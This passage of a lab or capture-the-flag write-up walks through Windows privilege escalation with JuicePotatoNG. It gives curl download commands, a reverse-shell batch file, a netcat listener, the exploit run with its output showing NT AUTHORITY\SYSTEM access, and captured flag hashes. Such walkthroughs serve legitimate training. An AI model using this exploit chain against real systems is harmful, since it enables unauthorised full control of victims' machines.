+**We transfer the file `JuicePotatoNG.exe` to the system through python**
+
+```bash
+#  Setting up web hosting on our system
+python3 -m http.server 
+
+# Download to file system
+curl IP:8000/JuicePotatoNG.exe -o jp.exe
+```
+
+Once we have `jp.exe` on the system we want to compromise, we will also need a `.bat`file
+- The `.bat` file is automatically activated in windows
+- We will place a reverse shell inside it.
+
+**We create a `priv.bat` file and place inside it a reverse shell in `base64` from `Revshells.com`**
+
+!2026-06-24 12_04_20-kali-linux-2026.1-vmware-amd64 - VMware Workstation.png
+
+**Transfer the bat file to the system we want to compromise**
+
+```bash
+# Setting up web hosting on our system again
+python3 -m http.server 
+
+# Download bat file to victime computer
+curl IP:8000/priv.bat -o priv.bat
+```
+
+- `jp.exe` when using system
+- `priv.bat` file is for reverse shell
+
+**We create a listener on our system `nc -lvnp 9001` and activate `juicepotato`**
+
+```bash
+PS C:\programdata> .\jp.exe -t * -p C:\programData\priv.bat
+
+         JuicyPotatoNG
+         by decoder_it & splinter_code
+
+[*] Testing CLSID {854A20FB-2D44-457D-992F-EF13785D2B51} - COM server port 10247 
+[+] authresult success {854A20FB-2D44-457D-992F-EF13785D2B51};NT AUTHORITY\SYSTEM;Impersonation
+[+] CreateProcessAsUser OK
+[+] Exploit successful! 
+```
+
+In our system we see that we have a shell as a system.
+
+```bash
+nc -lvnp 9001                                                                   
+listening on [any] 9001 ...
+connect to [10.10.15.219] from (UNKNOWN) [10.129.20.85] 64810
+
+PS C:\> whoami
+nt authority\system
+
+```
+
+Flags
+
+| **User** | **Password / Hash** | **Akses** |
+| --- | --- | --- |
+| miscsvc | user.txt | d9aa46c6aea9e787dd3d97540a86616b |
+| Administrator | root.txt | 69d5ffd2c6e101dd47935a56ed4290ba |
